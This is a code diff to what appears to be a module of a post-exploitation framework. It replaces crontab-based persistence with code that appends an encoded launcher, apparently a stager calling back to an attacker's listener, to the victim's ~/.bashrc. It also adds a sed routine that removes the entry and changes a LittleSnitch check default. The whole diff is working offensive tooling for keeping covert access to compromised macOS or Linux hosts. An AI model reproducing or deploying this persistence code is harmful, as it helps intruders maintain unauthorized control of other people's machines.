@@ -5,13 +5,13 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'Persistence with crontab via Launcher code',
+            'Name': 'Persistence with bashrc via Launcher code',
 
             # list of one or more authors for the module
-            'Author': ['@424f424f', '@sleventyeleven'],
+            'Author': ['@sleventyeleven'],
 
             # more verbose multi-line description of the module
-            'Description': 'This module establishes persistence via crontab',
+            'Description': 'This module establishes persistence via .bashrc',
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -35,22 +35,12 @@ class Module:
             #   value_name : {description, required, default_value}
             'Agent' : {
                 # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'Agent to establish a crontab',
+                'Description'   :   'Agent to establish via bashrc',
                 'Required'      :   True,
                 'Value'         :   ''
             },
             'Remove' : {
                 'Description'   :   'Remove All Persistence. True/False',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Hourly' : {
-                'Description'   :   'Hourly persistence.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Hour' : {
-                'Description'   :   'Hour to callback. 24hr format.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
@@ -62,7 +52,7 @@ class Module:
             'LittleSnitch' : {
                 'Description'   :   'Set for stager LittleSnitch checks.',
                 'Required'      :   True,
-                'Value'         :   'True'
+                'Value'         :   'False'
             }
         }
 
@@ -83,8 +73,6 @@ class Module:
 
     def generate(self):
         Remove = self.options['Remove']['Value']
-        Hourly = self.options['Hourly']['Value']
-        Hour = self.options['Hour']['Value']
         listenerName = self.options['Listener']['Value']
         littleSnitch = self.options['LittleSnitch']['Value']
         userAgent = self.options['Agent']['Value']
@@ -99,25 +87,18 @@ class Module:
 
         script = """
 import subprocess
-import sys
 Remove = "%s"
-Hourly = "%s"
-Hour = "%s"
+
+
 if Remove == "True":
-    cmd = 'crontab -l | grep -v "import sys,base64;exec(base64.b64decode("  | crontab -'
-    print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
-    print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
+    print subprocess.Popen("sed -i '' '/import sys,base64;exec(base64.b64decode(/d' ~/.bashrc", shell=True, stdout=subprocess.PIPE).stdout.read()
     print "Finished"
+
 else:
-    if Hourly == "True":
-        cmd = 'crontab -l | { cat; echo "0 * * * * %s"; } | crontab -'
-        print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
-        print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
-        print "Finished"
-    elif Hour:
-            cmd = 'crontab -l | { cat; echo "%s * * * * %s"; } | crontab -'
-            print subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read()
-            print subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read()
-            print "Finished"
-""" % (Remove, Hourly, Hour, launcher,  Hour, launcher)
-return script
+    print subprocess.Popen('echo "%s" >> ~/.bashrc', shell=True, stdout=subprocess.PIPE).stdout.read()
+    print "Finished"
+
+
+
+""" % (Remove, launcher)
+        return script
